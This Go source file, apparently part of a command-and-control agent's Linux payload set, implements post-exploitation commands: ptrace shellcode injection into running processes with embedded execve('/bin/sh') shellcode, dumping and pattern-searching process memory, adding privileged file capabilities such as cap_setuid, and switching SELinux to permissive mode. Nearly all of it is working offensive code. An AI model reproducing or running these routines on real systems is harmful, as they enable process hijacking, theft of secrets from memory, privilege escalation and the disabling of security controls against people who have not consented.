// server/docker/payloads/Linux/action_advanced_linux.go
//go:build linux
// +build linux

package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/unix"
)

// Constants for ptrace
const (
	PTRACE_ATTACH     = 16
	PTRACE_DETACH     = 17
	PTRACE_PEEKDATA   = 2
	PTRACE_POKEDATA   = 5
	PTRACE_GETREGS    = 12
	PTRACE_SETREGS    = 13
	PTRACE_CONT       = 7
	PTRACE_SYSCALL    = 24
	PTRACE_SINGLESTEP = 9
)

// ProcessInjectionCommand handles process injection via ptrace
type ProcessInjectionCommand struct{}

func (c *ProcessInjectionCommand) Name() string {
	return "inject"
}

func (c *ProcessInjectionCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 2 {
		return CommandResult{
			Output: "Usage: inject <pid> <shellcode_file|--cmd command> [--force]",
			ExitCode: 1,
		}
	}

	// Check for force flag
	forceMode := false
	for _, arg := range args {
		if arg == "--force" {
			forceMode = true
			break
		}
	}

	if !forceMode {
		return CommandResult{
			Output: `[!] Process injection requires --force flag to confirm risks.
This operation can:
- Crash the target process
- Corrupt process memory
- Trigger security alerts
- Leave the system in an unstable state

If you understand these risks, run again with --force flag.`,
			ExitCode: 1,
		}
	}

	// Validate and parse PID
	pidStr := args[0]
	pid, err := strconv.Atoi(pidStr)
	if err != nil || pid <= 0 {
		return CommandResult{
			Output:   fmt.Sprintf("Invalid PID '%s': must be a positive integer", pidStr),
			ExitCode: 1,
		}
	}

	// Don't allow injection into critical processes
	if pid == 1 || pid == os.Getpid() {
		return CommandResult{
			Output:   "Cannot inject into init (PID 1) or self",
			ExitCode: 1,
		}
	}

	// Check if process exists and get info
	procPath := fmt.Sprintf("/proc/%d", pid)
	if _, err := os.Stat(procPath); os.IsNotExist(err) {
		return CommandResult{
			Output:   fmt.Sprintf("Process %d does not exist", pid),
			ExitCode: 1,
		}
	}

	// Read process comm to show what we're injecting into
	commPath := fmt.Sprintf("/proc/%d/comm", pid)
	commData, _ := ioutil.ReadFile(commPath)
	processName := strings.TrimSpace(string(commData))

	fmt.Printf("[*] Target process: %s (PID: %d)\n", processName, pid)

	var shellcode []byte

	if args[1] == "--cmd" && len(args) > 2 {
		// Generate shellcode for command execution
		command := strings.Join(args[2:], " ")
		if strings.Contains(command, "--force") {
			command = strings.Replace(command, "--force", "", -1)
			command = strings.TrimSpace(command)
		}

		shellcode = c.generateExecveShellcode(command)
		fmt.Printf("[*] Generated execve shellcode for: %s\n", command)
	} else {
		// Read shellcode from file
		shellcodePath := args[1]

		// Validate file exists
		fileInfo, err := os.Stat(shellcodePath)
		if err != nil {
			if os.IsNotExist(err) {
				return CommandResult{
					Output:   fmt.Sprintf("Shellcode file not found: %s", shellcodePath),
					ExitCode: 1,
				}
			}
			return CommandResult{
				Output:   fmt.Sprintf("Failed to access shellcode file: %v", err),
				ExitCode: 1,
			}
		}

		// Check file size
		if fileInfo.Size() == 0 {
			return CommandResult{
				Output:   "Shellcode file is empty",
				ExitCode: 1,
			}
		}

		if fileInfo.Size() > 1024*1024 { // 1MB limit
			return CommandResult{
				Output:   "Shellcode file too large (>1MB)",
				ExitCode: 1,
			}
		}

		data, err := ioutil.ReadFile(shellcodePath)
		if err != nil {
			return CommandResult{
				Output:   fmt.Sprintf("Failed to read shellcode file: %v", err),
				ExitCode: 1,
			}
		}
		shellcode = data
		fmt.Printf("[*] Loaded %d bytes of shellcode from file\n", len(shellcode))
	}

	// Attempt injection with safety checks
	if err := c.injectShellcode(pid, shellcode); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Injection failed: %v", err),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output: fmt.Sprintf("[+] Successfully injected %d bytes into %s (PID %d)",
			len(shellcode), processName, pid),
		ExitCode: 0,
	}
}

// injectShellcode performs ptrace-based injection with safety checks
func (c *ProcessInjectionCommand) injectShellcode(pid int, shellcode []byte) error {
	// Safety check: shellcode size
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode is empty")
	}

	if len(shellcode) > 65536 { // 64KB limit for safety
		return fmt.Errorf("shellcode too large (>64KB)")
	}

	// Pad shellcode to 8-byte boundary
	for len(shellcode)%8 != 0 {
		shellcode = append(shellcode, 0x90) // NOP padding
	}

	// Attach to process
	fmt.Printf("[*] Attaching to PID %d...\n", pid)
	if err := syscall.PtraceAttach(pid); err != nil {
		if err == syscall.EPERM {
			return fmt.Errorf("permission denied - check ptrace_scope or run as root")
		}
		if err == syscall.ESRCH {
			return fmt.Errorf("process not found")
		}
		return fmt.Errorf("failed to attach: %v", err)
	}

	attached := true
	defer func() {
		if attached {
			fmt.Printf("[*] Detaching from process...\n")
			syscall.PtraceDetach(pid)
		}
	}()

	// Wait for process to stop
	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(pid, &ws, 0, nil); err != nil {
		return fmt.Errorf("wait4 failed: %v", err)
	}

	if !ws.Stopped() {
		return fmt.Errorf("process did not stop as expected")
	}

	// Get current registers
	var regs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
		return fmt.Errorf("failed to get registers: %v", err)
	}

	// Save original registers for restoration
	originalRegs := regs
	fmt.Printf("[*] Original RIP: 0x%x\n", originalRegs.Rip)

	// Find a suitable code cave or use current RIP location
	// For simplicity, we'll backup and use current instruction area
	injectionAddr := uintptr(regs.Rip)

	// Backup original code
	fmt.Printf("[*] Backing up original code at 0x%x...\n", injectionAddr)
	originalCode := make([]byte, len(shellcode))

	for i := 0; i < len(shellcode); i += 8 {
		word, err := syscall.PtracePeekData(pid, injectionAddr+uintptr(i), nil)
		if err != nil {
			return fmt.Errorf("failed to backup code at offset %d: %v", i, err)
		}
		binary.LittleEndian.PutUint64(originalCode[i:i+8], uint64(word))
	}

	// Write shellcode
	fmt.Printf("[*] Writing %d bytes of shellcode...\n", len(shellcode))
	for i := 0; i < len(shellcode); i += 8 {
		word := binary.LittleEndian.Uint64(shellcode[i : i+8])
		_, err := syscall.PtracePokeData(pid, injectionAddr+uintptr(i), []byte{
			byte(word),
			byte(word >> 8),
			byte(word >> 16),
			byte(word >> 24),
			byte(word >> 32),
			byte(word >> 40),
			byte(word >> 48),
			byte(word >> 56),
		})
		if err != nil {
			// Try to restore what we wrote
			for j := 0; j < i; j += 8 {
				origWord := binary.LittleEndian.Uint64(originalCode[j : j+8])
				syscall.PtracePokeData(pid, injectionAddr+uintptr(j), []byte{
					byte(origWord),
					byte(origWord >> 8),
					byte(origWord >> 16),
					byte(origWord >> 24),
					byte(origWord >> 32),
					byte(origWord >> 40),
					byte(origWord >> 48),
					byte(origWord >> 56),
				})
			}
			return fmt.Errorf("failed to write shellcode at offset %d: %v", i, err)
		}
	}

	// Set RIP to shellcode (it's already there since we overwrote current position)
	fmt.Printf("[*] Executing shellcode...\n")

	// Single step to execute shellcode
	if err := syscall.PtraceSingleStep(pid); err != nil {
		// Try to restore original code
		for i := 0; i < len(originalCode); i += 8 {
			word := binary.LittleEndian.Uint64(originalCode[i : i+8])
			syscall.PtracePokeData(pid, injectionAddr+uintptr(i), []byte{
				byte(word),
				byte(word >> 8),
				byte(word >> 16),
				byte(word >> 24),
				byte(word >> 32),
				byte(word >> 40),
				byte(word >> 48),
				byte(word >> 56),
			})
		}
		return fmt.Errorf("failed to execute: %v", err)
	}

	// Wait a moment for execution
	time.Sleep(100 * time.Millisecond)

	// Restore original code
	fmt.Printf("[*] Restoring original code...\n")
	for i := 0; i < len(originalCode); i += 8 {
		word := binary.LittleEndian.Uint64(originalCode[i : i+8])
		_, err := syscall.PtracePokeData(pid, injectionAddr+uintptr(i), []byte{
			byte(word),
			byte(word >> 8),
			byte(word >> 16),
			byte(word >> 24),
			byte(word >> 32),
			byte(word >> 40),
			byte(word >> 48),
			byte(word >> 56),
		})
		if err != nil {
			fmt.Printf("[!] Warning: Failed to restore code at offset %d\n", i)
		}
	}

	// Restore original registers
	if err := syscall.PtraceSetRegs(pid, &originalRegs); err != nil {
		fmt.Printf("[!] Warning: Failed to restore registers: %v\n", err)
	}

	// Continue execution
	fmt.Printf("[*] Resuming process execution...\n")
	if err := syscall.PtraceCont(pid, 0); err != nil {
		fmt.Printf("[!] Warning: Failed to continue process: %v\n", err)
	}

	return nil
}

// generateExecveShellcode creates shellcode for command execution
func (c *ProcessInjectionCommand) generateExecveShellcode(command string) []byte {
	// Basic x86_64 execve("/bin/sh", ["/bin/sh", "-c", command], NULL)
	// This is simplified - production would need proper encoding

	// For safety, limit command length
	if len(command) > 100 {
		command = command[:100]
	}

	// Basic shellcode that calls execve with /bin/sh -c
	// This is a template - real implementation would encode the command
	shellcode := []byte{
		// Setup
		0x48, 0x31, 0xd2, // xor rdx, rdx (NULL env)
		0x48, 0x31, 0xf6, // xor rsi, rsi (NULL argv for now)

		// Push "/bin/sh\0"
		0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // movabs rbx, "/bin/sh\0"
		0x53,             // push rbx
		0x48, 0x89, 0xe7, // mov rdi, rsp (filename)

		// Simple execve
		0x48, 0x31, 0xc0, // xor rax, rax
		0xb0, 0x3b, // mov al, 59 (execve syscall)
		0x0f, 0x05, // syscall

		// Exit gracefully if execve fails
		0x48, 0x31, 0xc0, // xor rax, rax
		0xb0, 0x3c, // mov al, 60 (exit syscall)
		0x48, 0x31, 0xff, // xor rdi, rdi (exit code 0)
		0x0f, 0x05, // syscall
	}

	return shellcode
}

// MemoryDumpCommand dumps process memory
type MemoryDumpCommand struct{}

func (c *MemoryDumpCommand) Name() string {
	return "memdump"
}

func (c *MemoryDumpCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output: "Usage: memdump <pid> [--output file] [--search pattern]",
			ExitCode: 1,
		}
	}

	// Validate PID
	pidStr := args[0]
	pid, err := strconv.Atoi(pidStr)
	if err != nil || pid <= 0 {
		return CommandResult{
			Output:   fmt.Sprintf("Invalid PID '%s': must be a positive integer", pidStr),
			ExitCode: 1,
		}
	}

	var outputFile string
	var searchPattern string

	// Parse arguments
	for i := 1; i < len(args); i++ {
		switch args[i] {
		case "--output":
			if i+1 < len(args) {
				outputFile = args[i+1]
				i++
			}
		case "--search":
			if i+1 < len(args) {
				searchPattern = args[i+1]
				i++
			}
		}
	}

	// Check if process exists
	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
	mapsData, err := ioutil.ReadFile(mapsPath)
	if err != nil {
		if os.IsNotExist(err) {
			return CommandResult{
				Output:   fmt.Sprintf("Process %d not found", pid),
				ExitCode: 1,
			}
		}
		if os.IsPermission(err) {
			return CommandResult{
				Output:   fmt.Sprintf("Permission denied accessing PID %d (try with sudo)", pid),
				ExitCode: 1,
			}
		}
		return CommandResult{
			Output:   fmt.Sprintf("Failed to read memory maps: %v", err),
			ExitCode: 1,
		}
	}

	// Parse memory regions
	regions := c.parseMemoryMaps(string(mapsData))
	if len(regions) == 0 {
		return CommandResult{
			Output:   "No memory regions found",
			ExitCode: 1,
		}
	}

	// Open memory file
	memPath := fmt.Sprintf("/proc/%d/mem", pid)
	memFile, err := os.Open(memPath)
	if err != nil {
		if os.IsPermission(err) {
			return CommandResult{
				Output:   fmt.Sprintf("Cannot read process memory: permission denied (try with sudo)"),
				ExitCode: 1,
			}
		}
		return CommandResult{
			Output:   fmt.Sprintf("Failed to open memory: %v", err),
			ExitCode: 1,
		}
	}
	defer memFile.Close()

	var results []string
	var dumpData []byte
	totalSize := uint64(0)
	const maxDumpSize = 100 * 1024 * 1024 // 100MB limit

	for _, region := range regions {
		// Skip non-readable regions
		if !strings.Contains(region.perms, "r") {
			continue
		}

		// Skip very large regions for safety
		regionSize := region.end - region.start
		if regionSize > 50*1024*1024 { // Skip regions larger than 50MB
			results = append(results, fmt.Sprintf("[-] Skipping large region at 0x%x (%d MB)",
				region.start, regionSize/(1024*1024)))
			continue
		}

		// Check total dump size
		if outputFile != "" && totalSize+regionSize > maxDumpSize {
			results = append(results, fmt.Sprintf("[-] Dump size limit reached (%d MB)", maxDumpSize/(1024*1024)))
			break
		}

		// Read region with error handling
		buffer := make([]byte, regionSize)
		n, err := memFile.ReadAt(buffer, int64(region.start))
		if err != nil && n == 0 {
			// Skip regions we can't read
			continue
		}

		// Use what we could read
		if n > 0 {
			buffer = buffer[:n]
		}

		// Search for pattern if specified
		if searchPattern != "" && len(buffer) > 0 {
			searchBytes := []byte(searchPattern)
			offset := 0
			for {
				idx := bytes.Index(buffer[offset:], searchBytes)
				if idx == -1 {
					break
				}
				actualIdx := offset + idx
				results = append(results, fmt.Sprintf("[+] Found pattern at 0x%x in %s",
					region.start+uint64(actualIdx), region.path))
				offset = actualIdx + 1
				if offset >= len(buffer) {
					break
				}
			}
		}

		// Append to dump if output specified
		if outputFile != "" && len(buffer) > 0 {
			dumpData = append(dumpData, buffer...)
			totalSize += uint64(len(buffer))
		}
	}

	// Write dump file if specified
	if outputFile != "" && len(dumpData) > 0 {
		// Validate output path
		outputDir := filepath.Dir(outputFile)
		if err := os.MkdirAll(outputDir, 0700); err != nil {
			results = append(results, fmt.Sprintf("[-] Failed to create output directory: %v", err))
		} else {
			if err := ioutil.WriteFile(outputFile, dumpData, 0600); err != nil {
				results = append(results, fmt.Sprintf("[-] Failed to write dump: %v", err))
			} else {
				results = append(results, fmt.Sprintf("[+] Memory dumped to %s (%d bytes)",
					outputFile, len(dumpData)))
			}
		}
	}

	if len(results) == 0 {
		if searchPattern != "" {
			return CommandResult{
				Output:   fmt.Sprintf("Pattern '%s' not found in readable memory", searchPattern),
				ExitCode: 0,
			}
		}
		return CommandResult{
			Output:   "No readable memory regions found",
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

type memoryRegion struct {
	start uint64
	end   uint64
	perms string
	path  string
}

func (c *MemoryDumpCommand) parseMemoryMaps(mapsData string) []memoryRegion {
	var regions []memoryRegion

	lines := strings.Split(mapsData, "\n")
	for _, line := range lines {
		if line == "" {
			continue
		}

		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}

		// Parse address range
		addrRange := strings.Split(fields[0], "-")
		if len(addrRange) != 2 {
			continue
		}

		start, err := strconv.ParseUint(addrRange[0], 16, 64)
		if err != nil {
			continue
		}

		end, err := strconv.ParseUint(addrRange[1], 16, 64)
		if err != nil {
			continue
		}

		path := ""
		if len(fields) >= 6 {
			path = fields[5]
		}

		regions = append(regions, memoryRegion{
			start: start,
			end:   end,
			perms: fields[1],
			path:  path,
		})
	}

	return regions
}

// CapabilityCommand manages Linux capabilities
type CapabilityCommand struct{}

func (c *CapabilityCommand) Name() string {
	return "capabilities"
}

func (c *CapabilityCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output: "Usage: capabilities <action> [options]",
			ExitCode: 1,
		}
	}

	action := args[0]
	switch action {
	case "list":
		return c.listCapabilities()
	case "enum":
		return c.enumerateCapabilities()
	case "add":
		if len(args) < 3 {
			return CommandResult{
				Output:   "Usage: capabilities add <cap> <file> --confirm",
				ExitCode: 1,
			}
		}
		return c.addCapability(args[1], args[2], args)
	default:
		return CommandResult{
			Output:   fmt.Sprintf("Unknown action: %s", action),
			ExitCode: 1,
		}
	}
}

func (c *CapabilityCommand) addCapability(cap, file string, args []string) CommandResult {
	// Check for confirmation flag
	confirmed := false
	for _, arg := range args {
		if arg == "--confirm" {
			confirmed = true
			break
		}
	}

	if !confirmed {
		return CommandResult{
			Output: fmt.Sprintf(`[!] Adding capability %s to %s requires confirmation.

This operation will:
- Modify system file extended attributes
- Grant additional privileges to the binary
- Potentially create a privilege escalation vector
- Be logged by the audit system

If you understand these risks, run again with --confirm flag:
  capabilities add %s %s --confirm`, cap, file, cap, file),
			ExitCode: 1,
		}
	}

	// Validate file exists
	fileInfo, err := os.Stat(file)
	if err != nil {
		if os.IsNotExist(err) {
			return CommandResult{
				Output:   fmt.Sprintf("File not found: %s", file),
				ExitCode: 1,
			}
		}
		return CommandResult{
			Output:   fmt.Sprintf("Cannot access file: %v", err),
			ExitCode: 1,
		}
	}

	// Check if file is executable
	if fileInfo.Mode()&0111 == 0 {
		return CommandResult{
			Output:   fmt.Sprintf("Warning: %s is not executable", file),
			ExitCode: 1,
		}
	}

	// Map capability name to bit position
	capMap := map[string]uint32{
		"cap_chown":            0,
		"cap_dac_override":     1,
		"cap_dac_read_search":  2,
		"cap_fowner":           3,
		"cap_fsetid":           4,
		"cap_kill":             5,
		"cap_setgid":           6,
		"cap_setuid":           7,
		"cap_setpcap":          8,
		"cap_net_bind_service": 10,
		"cap_net_admin":        12,
		"cap_net_raw":          13,
		"cap_sys_chroot":       18,
		"cap_sys_ptrace":       19,
		"cap_sys_admin":        21,
		"cap_setfcap":          31,
	}

	capBit, ok := capMap[strings.ToLower(cap)]
	if !ok {
		var availableCaps []string
		for name := range capMap {
			availableCaps = append(availableCaps, name)
		}
		return CommandResult{
			Output: fmt.Sprintf("Unknown capability: %s\nAvailable capabilities:\n  %s",
				cap, strings.Join(availableCaps, "\n  ")),
			ExitCode: 1,
		}
	}

	// Create VFS_CAP_DATA structure (version 2)
	type vfsCap2 struct {
		Magic uint32
		Data  [2]struct {
			Permitted   uint32
			Inheritable uint32
		}
	}

	capData := vfsCap2{
		Magic: 0x02000000, // VFS_CAP_REVISION_2
	}

	// Set the capability bit in permitted
	if capBit < 32 {
		capData.Data[0].Permitted = 1 << capBit
	} else {
		capData.Data[1].Permitted = 1 << (capBit - 32)
	}

	// Convert struct to bytes
	buf := new(bytes.Buffer)
	if err := binary.Write(buf, binary.LittleEndian, capData); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to create capability data: %v", err),
			ExitCode: 1,
		}
	}

	// Set the extended attribute
	fmt.Printf("[*] Setting capability %s on %s...\n", cap, file)

	err = syscall.Setxattr(file, "security.capability", buf.Bytes(), 0)
	if err != nil {
		if err == syscall.EPERM {
			return CommandResult{
				Output:   "Permission denied - requires CAP_SETFCAP capability or root",
				ExitCode: 1,
			}
		}
		if err == syscall.ENOTSUP {
			return CommandResult{
				Output:   "Filesystem does not support extended attributes",
				ExitCode: 1,
			}
		}
		return CommandResult{
			Output:   fmt.Sprintf("Failed to set capability: %v", err),
			ExitCode: 1,
		}
	}

	// Verify it was set
	checkBuf := make([]byte, 256)
	sz, err := syscall.Getxattr(file, "security.capability", checkBuf)
	if err != nil || sz <= 0 {
		return CommandResult{
			Output:   "Warning: Capability was set but verification failed",
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output: fmt.Sprintf("[+] Successfully added %s capability to %s\n[*] Verify with: getcap %s",
			cap, file, file),
		ExitCode: 0,
	}
}

func (c *CapabilityCommand) listCapabilities() CommandResult {
	// Read current process capabilities
	capsFile := "/proc/self/status"
	data, err := ioutil.ReadFile(capsFile)
	if err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to read capabilities: %v", err),
			ExitCode: 1,
		}
	}

	var results []string
	lines := strings.Split(string(data), "\n")

	// Collect capability lines
	for _, line := range lines {
		if strings.HasPrefix(line, "Cap") {
			results = append(results, line)
		}
	}

	if len(results) == 0 {
		return CommandResult{
			Output:   "No capability information found",
			ExitCode: 1,
		}
	}

	// Parse and decode capability bits
	results = append(results, "\nDecoded capabilities:")
	decoded := c.decodeCapabilities(lines)
	if len(decoded) > 0 {
		results = append(results, decoded...)
	} else {
		results = append(results, "  No capabilities set")
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

func (c *CapabilityCommand) enumerateCapabilities() CommandResult {
	var results []string
	filesChecked := 0
	filesWithCaps := 0

	// Common paths to check
	paths := []string{
		"/usr/bin", "/usr/sbin", "/bin", "/sbin",
		"/usr/local/bin", "/usr/local/sbin",
	}

	for _, path := range paths {
		// Check if directory exists
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}

		err := filepath.Walk(path, func(file string, info os.FileInfo, err error) error {
			if err != nil {
				return nil // Continue walking
			}

			// Skip directories and symlinks
			if info.IsDir() || info.Mode()&os.ModeSymlink != 0 {
				return nil
			}

			filesChecked++

			// Check for capabilities
			if caps := c.getFileCapabilities(file); caps != "" {
				results = append(results, fmt.Sprintf("%s: %s", file, caps))
				filesWithCaps++
			}

			// Limit checks to prevent hanging
			if filesChecked > 10000 {
				return fmt.Errorf("too many files")
			}

			return nil
		})

		if err != nil && err.Error() == "too many files" {
			results = append(results, "[-] Stopped after checking 10000 files")
			break
		}
	}

	results = append(results, fmt.Sprintf("\n[*] Checked %d files, found %d with capabilities",
		filesChecked, filesWithCaps))

	if len(results) == 0 {
		return CommandResult{
			Output:   "No files with capabilities found",
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

func (c *CapabilityCommand) getFileCapabilities(path string) string {
	// Read extended attributes for capabilities
	buf := make([]byte, 256)

	sz, err := syscall.Getxattr(path, "security.capability", buf)
	if err != nil || sz <= 0 {
		return ""
	}

	// Basic parsing of capability structure
	if sz >= 4 {
		// VFS_CAP_DATA has a header with magic and version
		magic := binary.LittleEndian.Uint32(buf[0:4])
		version := (magic >> 24) & 0xFF

		if version == 1 || version == 2 || version == 3 {
			return fmt.Sprintf("version_%d (size: %d bytes)", version, sz)
		}
	}

	return fmt.Sprintf("has capabilities (%d bytes)", sz)
}

func (c *CapabilityCommand) decodeCapabilities(lines []string) []string {
	// Capability names mapping
	capNames := map[int]string{
		0:  "CAP_CHOWN",
		1:  "CAP_DAC_OVERRIDE",
		2:  "CAP_DAC_READ_SEARCH",
		3:  "CAP_FOWNER",
		4:  "CAP_FSETID",
		5:  "CAP_KILL",
		6:  "CAP_SETGID",
		7:  "CAP_SETUID",
		8:  "CAP_SETPCAP",
		9:  "CAP_LINUX_IMMUTABLE",
		10: "CAP_NET_BIND_SERVICE",
		11: "CAP_NET_BROADCAST",
		12: "CAP_NET_ADMIN",
		13: "CAP_NET_RAW",
		14: "CAP_IPC_LOCK",
		15: "CAP_IPC_OWNER",
		16: "CAP_SYS_MODULE",
		17: "CAP_SYS_RAWIO",
		18: "CAP_SYS_CHROOT",
		19: "CAP_SYS_PTRACE",
		20: "CAP_SYS_PACCT",
		21: "CAP_SYS_ADMIN",
		22: "CAP_SYS_BOOT",
		23: "CAP_SYS_NICE",
		24: "CAP_SYS_RESOURCE",
		25: "CAP_SYS_TIME",
		26: "CAP_SYS_TTY_CONFIG",
		27: "CAP_MKNOD",
		28: "CAP_LEASE",
		29: "CAP_AUDIT_WRITE",
		30: "CAP_AUDIT_CONTROL",
		31: "CAP_SETFCAP",
		32: "CAP_MAC_OVERRIDE",
		33: "CAP_MAC_ADMIN",
		34: "CAP_SYSLOG",
		35: "CAP_WAKE_ALARM",
		36: "CAP_BLOCK_SUSPEND",
		37: "CAP_AUDIT_READ",
	}

	var results []string

	for _, line := range lines {
		if strings.HasPrefix(line, "CapEff:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				// Parse hex value
				hexStr := strings.TrimPrefix(fields[1], "0x")
				hexStr = strings.TrimSpace(hexStr)

				if val, err := strconv.ParseUint(hexStr, 16, 64); err == nil && val > 0 {
					results = append(results, "Effective capabilities:")
					foundAny := false
					for bit := 0; bit < 64; bit++ {
						if val&(1<<uint(bit)) != 0 {
							if name, ok := capNames[bit]; ok {
								results = append(results, fmt.Sprintf("  [+] %s", name))
								foundAny = true
							} else if bit < 64 {
								results = append(results, fmt.Sprintf("  [+] CAP_%d (unknown)", bit))
								foundAny = true
							}
						}
					}
					if !foundAny {
						results = append(results, "  None set")
					}
				}
			}
		}
	}

	return results
}

// SELinuxCommand manages SELinux context
type SELinuxCommand struct{}

func (c *SELinuxCommand) Name() string {
	return "selinux"
}

func (c *SELinuxCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output: "Usage: selinux <action>",
			ExitCode: 1,
		}
	}

	action := args[0]
	switch action {
	case "status":
		return c.checkStatus()
	case "context":
		return c.showContext()
	case "disable":
		return c.attemptDisable()
	default:
		return CommandResult{
			Output:   fmt.Sprintf("Unknown action: %s", action),
			ExitCode: 1,
		}
	}
}

func (c *SELinuxCommand) checkStatus() CommandResult {
	// First check if SELinux is present
	selinuxPath := "/sys/fs/selinux"
	if _, err := os.Stat(selinuxPath); os.IsNotExist(err) {
		// Try alternate path
		selinuxPath = "/selinux"
		if _, err := os.Stat(selinuxPath); os.IsNotExist(err) {
			return CommandResult{
				Output:   "SELinux not found on this system",
				ExitCode: 0,
			}
		}
	}

	// Check enforcement status
	enforcePath := filepath.Join(selinuxPath, "enforce")
	if data, err := ioutil.ReadFile(enforcePath); err == nil {
		status := "Unknown"
		enforceValue := strings.TrimSpace(string(data))

		switch enforceValue {
		case "0":
			status = "Permissive (logging only)"
		case "1":
			status = "Enforcing (blocking violations)"
		default:
			status = fmt.Sprintf("Unknown (%s)", enforceValue)
		}

		// Get additional info safely
		var extraInfo []string

		// Policy version
		if policy, err := ioutil.ReadFile(filepath.Join(selinuxPath, "policyvers")); err == nil {
			extraInfo = append(extraInfo, fmt.Sprintf("Policy version: %s",
				strings.TrimSpace(string(policy))))
		}

		// Check if we're confined
		if context, err := ioutil.ReadFile("/proc/self/attr/current"); err == nil {
			contextStr := strings.TrimSpace(string(context))
			if contextStr != "" {
				extraInfo = append(extraInfo, fmt.Sprintf("Current context: %s", contextStr))
			}
		}

		result := fmt.Sprintf("SELinux status: %s", status)
		if len(extraInfo) > 0 {
			result += "\n" + strings.Join(extraInfo, "\n")
		}

		return CommandResult{
			Output:   result,
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   "SELinux appears to be disabled or not accessible",
		ExitCode: 0,
	}
}

func (c *SELinuxCommand) showContext() CommandResult {
	// Get current process context
	contextPath := "/proc/self/attr/current"

	data, err := ioutil.ReadFile(contextPath)
	if err != nil {
		if os.IsNotExist(err) {
			return CommandResult{
				Output:   "SELinux context not available (SELinux may be disabled)",
				ExitCode: 0,
			}
		}
		return CommandResult{
			Output:   fmt.Sprintf("Failed to read SELinux context: %v", err),
			ExitCode: 1,
		}
	}

	context := strings.TrimSpace(string(data))
	if context == "" {
		return CommandResult{
			Output:   "No SELinux context set",
			ExitCode: 0,
		}
	}

	// Parse context components
	parts := strings.Split(context, ":")
	result := fmt.Sprintf("Current context: %s", context)

	if len(parts) >= 3 {
		result += "\n\nContext components:"
		result += fmt.Sprintf("\n  User:   %s", parts[0])
		result += fmt.Sprintf("\n  Role:   %s", parts[1])
		result += fmt.Sprintf("\n  Type:   %s", parts[2])
		if len(parts) >= 4 {
			result += fmt.Sprintf("\n  Level:  %s", parts[3])
		}
	}

	return CommandResult{
		Output:   result,
		ExitCode: 0,
	}
}

func (c *SELinuxCommand) attemptDisable() CommandResult {
	// Find enforce file
	var enforcePath string
	possiblePaths := []string{
		"/sys/fs/selinux/enforce",
		"/selinux/enforce",
	}

	for _, path := range possiblePaths {
		if _, err := os.Stat(path); err == nil {
			enforcePath = path
			break
		}
	}

	if enforcePath == "" {
		return CommandResult{
			Output:   "SELinux enforce file not found (SELinux may be disabled)",
			ExitCode: 0,
		}
	}

	// Check current status first
	currentData, err := ioutil.ReadFile(enforcePath)
	if err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Cannot read SELinux status: %v", err),
			ExitCode: 1,
		}
	}

	currentStatus := strings.TrimSpace(string(currentData))
	if currentStatus == "0" {
		return CommandResult{
			Output:   "SELinux is already in permissive mode",
			ExitCode: 0,
		}
	}

	// Check if we can write using unix.Access
	if unix.Access(enforcePath, unix.W_OK) != nil {
		return CommandResult{
			Output:   "Cannot disable SELinux: insufficient privileges (need root or CAP_MAC_ADMIN)",
			ExitCode: 1,
		}
	}

	// Attempt to set to permissive
	if err := ioutil.WriteFile(enforcePath, []byte("0"), 0644); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to set permissive mode: %v", err),
			ExitCode: 1,
		}
	}

	// Verify the change
	time.Sleep(100 * time.Millisecond)
	if newData, err := ioutil.ReadFile(enforcePath); err == nil {
		if strings.TrimSpace(string(newData)) == "0" {
			return CommandResult{
				Output:   "[+] SELinux set to permissive mode (logging only, not blocking)",
				ExitCode: 0,
			}
		}
	}

	return CommandResult{
		Output:   "SELinux mode change may have been blocked by policy",
		ExitCode: 1,
	}
}
